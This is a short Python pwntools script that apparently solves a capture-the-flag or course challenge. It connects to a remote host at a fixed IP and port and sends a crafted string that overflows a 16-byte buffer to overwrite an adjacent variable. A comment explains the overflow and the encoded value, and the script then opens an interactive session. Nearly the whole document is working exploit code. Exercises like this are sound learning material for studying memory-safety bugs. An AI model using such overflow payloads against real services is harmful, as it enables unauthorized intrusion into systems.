from pwn import *

r = remote('140.113.207.233',8851)
r.recvuntil(': ')
"""
buff has only 16 bytes, but read() enable to read 20 bytes
extra 4 bytes overflows to ans
'0' = BIN 00110000
DEC 808464432 = BIN 00110000,00110000,00110000,00110000
"""
r.sendline('0' * 20 + '808464432')

r.interactive()
